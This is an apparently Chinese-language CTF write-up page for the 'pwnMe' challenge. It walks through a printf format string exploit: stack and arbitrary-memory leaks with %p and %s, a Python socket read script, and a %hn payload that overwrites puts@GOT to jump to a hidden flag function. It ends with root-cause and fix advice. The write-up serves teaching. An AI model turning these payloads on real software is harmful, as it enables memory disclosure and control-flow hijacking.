@@ -1,0 +1,1339 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="CTF 竞赛解题记录与学习笔记">
+      
+      
+        <meta name="author" content="BIGC CTF Team">
+      
+      
+        <link rel="canonical" href="https://starnotes-xj.github.io/BIGC_CTF_Writeups/Pwn/MetaCTF_pwnMe/">
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>MetaCTF - pwnMe Writeup - BIGC CTF Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra_v3.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#metactf-pwnme-writeup" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="BIGC CTF Writeups" class="md-header__button md-logo" aria-label="BIGC CTF Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 11c0 5.55-3.84 10.74-9 12-5.16-1.26-9-6.45-9-12V5l9-4 9 4zm-9 10c3.75-1 7-5.46 7-9.78V6.3l-7-3.12z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            BIGC CTF Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              MetaCTF - pwnMe Writeup
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  首页
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../guides/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  新手指南
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../Web/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Web
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../Cryptography%28%E5%AF%86%E7%A0%81%E5%AD%A6%29/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  密码学
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../Reverse%20Engineering%28%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%29/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  逆向工程
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Pwn
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../Misc%28%E6%9D%82%E9%A1%B9%29/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  杂项
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../PPC/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  PPC
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../events/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  比赛
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../history/competitions/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  历史参赛记录
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../tags/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  标签
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../WRITEUP_TEMPLATE/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  模板
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="BIGC CTF Writeups" class="md-nav__button md-logo" aria-label="BIGC CTF Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 11c0 5.55-3.84 10.74-9 12-5.16-1.26-9-6.45-9-12V5l9-4 9 4zm-9 10c3.75-1 7-5.46 7-9.78V6.3l-7-3.12z"/></svg>
+
+    </a>
+    BIGC CTF Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    首页
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../guides/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    新手指南
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cryptography%28%E5%AF%86%E7%A0%81%E5%AD%A6%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    密码学
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Reverse%20Engineering%28%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    逆向工程
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pwn
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Misc%28%E6%9D%82%E9%A1%B9%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    杂项
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../PPC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PPC
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../events/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    比赛
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../history/competitions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    历史参赛记录
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tags/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    标签
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../WRITEUP_TEMPLATE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    模板
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        题目信息
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flag
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        解题过程
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="解题过程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. 初始侦察/服务识别
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-np-ns" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. 利用 %n$p / %n$s 枚举栈与指针
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. 任意地址读定位关键字符串与隐藏函数
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-got" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. 利用格式化字符串改写 GOT
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. 获取 Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        攻击链 / 解题流程总结
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        漏洞分析 / 机制分析
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="漏洞分析 / 机制分析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        根因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        影响
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        修复建议
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        知识点
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        使用的工具
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        脚本归档
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gui" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        命令行提取关键数据（无 GUI）
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="metactf-pwnme-writeup">MetaCTF - pwnMe Writeup<a class="headerlink" href="#metactf-pwnme-writeup" title="Permanent link">&para;</a></h1>
+<h2 id="_1">题目信息<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>比赛</strong>: MetaCTF</li>
+<li><strong>题目</strong>: pwnMe</li>
+<li><strong>类别</strong>: Pwn</li>
+<li><strong>难度</strong>: 简单</li>
+<li><strong>附件/URL</strong>: <code>nc.umbccd.net:8925</code></li>
+<li><strong>附件链接</strong>: 无本地附件，题面提供源码与远程服务</li>
+<li><strong>Flag格式</strong>: <code>DawgCTF{...}</code></li>
+<li><strong>状态</strong>: 已解</li>
+</ul>
+<h2 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>DawgCTF{s3v3r_PWNed!}
+</code></pre></div>
+<h2 id="_2">解题过程<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h3 id="1">1. 初始侦察/服务识别<a class="headerlink" href="#1" title="Permanent link">&para;</a></h3>
+<ul>
+<li>连接远程服务后，首次不会主动输出任何内容；只有发送输入后，服务才会把内容打印出来。</li>
+<li>先发送普通字符串验证交互：</li>
+</ul>
+<div class="highlight"><pre><span></span><code>$ nc nc.umbccd.net 8925
+hello
+hello
+
+Goodbye!
+</code></pre></div>
+<ul>
+<li>这说明程序大致逻辑是“读入一行 -&gt; 打印该行 -&gt; 再打印 <code>Goodbye!</code>”。</li>
+<li>接着发送格式化字符串探针：</li>
+</ul>
+<div class="highlight"><pre><span></span><code>%p %p %p %p %p %p %p %p
+</code></pre></div>
+<ul>
+<li>远程返回了真实地址和值，而不是字面量 <code>%p</code>：</li>
+</ul>
+<div class="highlight"><pre><span></span><code>0x7ffff7fac963 0xfbad208b 0x7fffffffe2a0 (nil) (nil) 0x7025207025207025 ...
+</code></pre></div>
+<ul>
+<li>这说明服务端存在典型的格式化字符串漏洞，即把用户输入直接交给了 <code>printf(buf)</code> 一类函数。</li>
+</ul>
+<h3 id="2-np-ns">2. 利用 <code>%n$p</code> / <code>%n$s</code> 枚举栈与指针<a class="headerlink" href="#2-np-ns" title="Permanent link">&para;</a></h3>
+<ul>
+<li>继续用位置参数枚举栈槽位：</li>
+</ul>
+<div class="highlight"><pre><span></span><code>%1$p|%2$p|...|%40$p
+</code></pre></div>
+<ul>
+<li>可以稳定看到几个关键值：</li>
+<li><code>0x401248</code> 这样的程序代码段地址，说明程序是 <strong>non-PIE</strong></li>
+<li><code>0x403df0</code>、<code>0x404000</code> 一带的静态地址，说明 GOT / 数据段地址固定</li>
+<li>
+<p><code>0x7fffffffe***</code> 一带的栈地址</p>
+</li>
+<li>
+<p>再用 <code>%n$s</code> 去把某些槽位当作指针解引用，可以直接泄露进程参数和环境变量。例如：</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code>%57$s -&gt; ./pwnMe
+%59$s -&gt; SHELL=/bin/bash
+%60$s -&gt; PWD=/home/dawgctf/chals/med
+...
+</code></pre></div>
+<ul>
+<li>这一步证明了两点：</li>
+<li>我们不只可以“读栈值”，还可以做<strong>任意地址读</strong></li>
+<li>程序确实运行在固定路径下，且二进制名为 <code>pwnMe</code></li>
+</ul>
+<h3 id="3">3. 任意地址读定位关键字符串与隐藏函数<a class="headerlink" href="#3" title="Permanent link">&para;</a></h3>
+<ul>
+<li>在 64 位 System V ABI 下，前 6 个 <code>printf</code> 参数走寄存器；如果我们把地址附加到输入末尾，再用 <code>%7$s</code>，就可以把第一个附加的 8 字节当作指针读取。</li>
+<li>用 Python 构造的最小任意地址读原型如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span><span class="o">,</span><span class="w"> </span><span class="nn">struct</span>
+
+<span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400000</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%7$.32sA&#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="s1">&#39;nc.umbccd.net&#39;</span><span class="p">,</span> <span class="mi">8925</span><span class="p">))</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;latin1&#39;</span><span class="p">))</span>
+</code></pre></div>
+<ul>
+<li>对 ELF 头 <code>0x400000</code> 读取成功后，就可以继续扫 <code>.rodata</code>。在 <code>0x402000</code> 一带读到了非常关键的字符串：</li>
+</ul>
+<div class="highlight"><pre><span></span><code>0x402008 -&gt; flag.txt
+0x402018 -&gt; Error opening flag file.
+0x402028 -&gt; Flag: %s
+</code></pre></div>
+<ul>
+<li>这说明二进制内部并不只是“回显输入”，还额外包含一段<strong>打开 <code>flag.txt</code> 并打印 <code>Flag: %s</code></strong> 的隐藏逻辑。</li>
+<li>接着围绕代码段 <code>0x401190</code> 一带继续读指令字节，可以定位出一个隐藏函数入口 <code>0x401196</code>。结合题面源码与远程行为，可以确认它就是读取并输出 flag 的函数。</li>
+</ul>
+<h3 id="4-got">4. 利用格式化字符串改写 GOT<a class="headerlink" href="#4-got" title="Permanent link">&para;</a></h3>
+<ul>
+<li>服务在回显输入后一定会再调用一次：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Goodbye!&quot;</span><span class="p">);</span>
+</code></pre></div>
+<ul>
+<li>因此最直接的思路不是 ROP，而是把 <code>puts@GOT</code> 改写成隐藏函数 <code>print_flag</code> 的地址。这样程序原本打印 <code>Goodbye!</code> 的位置，就会自动跳去打印 flag。</li>
+<li>远程泄露可确认：</li>
+<li><code>puts@GOT = 0x404000</code></li>
+<li>
+<p><code>print_flag = 0x401196</code></p>
+</li>
+<li>
+<p>目标地址是：</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code>0x0000000000401196
+</code></pre></div>
+<ul>
+<li>由于格式化字符串支持 <code>%hn</code>，可以按 2 字节分块写入：</li>
+<li><code>0x404000</code> &lt;- <code>0x1196</code></li>
+<li><code>0x404002</code> &lt;- <code>0x0040</code></li>
+<li><code>0x404004</code> &lt;- <code>0x0000</code></li>
+<li>
+<p><code>0x404006</code> &lt;- <code>0x0000</code></p>
+</li>
+<li>
+<p>最终使用的 payload 思路是：</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code>%11$hn%12$hn%1$64c%13$hn%1$4438c%14$hnAA + p64(0x404004) + p64(0x404006) + p64(0x404002) + p64(0x404000)
+</code></pre></div>
+<ul>
+<li>这里先把高 4 字节清零，再把低 2 个 halfword 分别写成 <code>0x0040</code> 和 <code>0x1196</code>。字符数累计精确控制后，<code>puts@GOT</code> 就被覆盖为 <code>0x401196</code>。</li>
+</ul>
+<h3 id="5-flag">5. 获取 Flag<a class="headerlink" href="#5-flag" title="Permanent link">&para;</a></h3>
+<ul>
+<li>发送上面的 payload 后，程序不再调用真正的 <code>puts</code>，而是跳进隐藏函数：</li>
+</ul>
+<div class="highlight"><pre><span></span><code>Flag: DawgCTF{s3v3r_PWNed!}
+</code></pre></div>
+<ul>
+<li>最终 flag 为：</li>
+</ul>
+<div class="highlight"><pre><span></span><code>DawgCTF{s3v3r_PWNed!}
+</code></pre></div>
+<h2 id="_3">攻击链 / 解题流程总结<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>连接服务验证普通回显 -&gt; 用 %p 确认 printf 格式化字符串漏洞 -&gt; 用位置参数与 %s 做栈/任意地址读 -&gt; 在 .rodata 中发现 flag.txt 与 &quot;Flag: %s&quot; -&gt; 定位隐藏 print_flag 函数地址 0x401196 -&gt; 用 %hn 分块覆盖 puts@GOT(0x404000) -&gt; 程序执行 puts(&quot;Goodbye!&quot;) 时跳转到 print_flag -&gt; 输出 flag
+</code></pre></div>
+<h2 id="_4">漏洞分析 / 机制分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<h3 id="_5">根因<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<ul>
+<li>程序把用户可控字符串直接作为格式字符串传给 <code>printf</code>，而不是使用 <code>printf("%s", buf)</code>。</li>
+<li>这使攻击者可以：</li>
+<li>用 <code>%p</code> / <code>%x</code> 泄露栈内容</li>
+<li>用 <code>%s</code> 解引用任意指针</li>
+<li>用 <code>%n</code> / <code>%hn</code> / <code>%hhn</code> 向任意地址写入</li>
+</ul>
+<h3 id="_6">影响<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<ul>
+<li>在 non-PIE、Partial RELRO 或未完全保护的二进制中，格式化字符串漏洞通常可以直接变成 GOT 覆盖。</li>
+<li>本题中借助固定地址与后续的 <code>puts("Goodbye!")</code> 调用，可以一跳进入隐藏的 flag 函数，不需要额外构造 ROP 链。</li>
+</ul>
+<h3 id="_7">修复建议<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<ul>
+<li>永远不要把用户输入直接作为格式字符串传入 <code>printf</code> 家族函数。</li>
+<li>改为：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">);</span>
+</code></pre></div>
+<ul>
+<li>同时启用完整的现代防护：</li>
+<li>Full RELRO，防止 GOT 被覆盖</li>
+<li>PIE，增加代码地址随机化</li>
+<li>栈保护与 ASLR，降低信息泄露后的利用稳定性</li>
+</ul>
+<h2 id="_8">知识点<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
+<ul>
+<li>格式化字符串漏洞（Format String Vulnerability）</li>
+<li>位置参数利用（如 <code>%7$s</code>、<code>%11$hn</code>）</li>
+<li>任意地址读与 GOT 覆盖</li>
+<li>non-PIE 程序中的静态地址利用</li>
+</ul>
+<h2 id="_9">使用的工具<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>nc / netcat</strong>: 验证服务交互，快速发送格式化字符串探针</li>
+<li><strong>Python 3</strong>: 构造任意地址读与最终利用 payload</li>
+<li><strong>PowerShell</strong>: 在本地做批量枚举与结果整理</li>
+</ul>
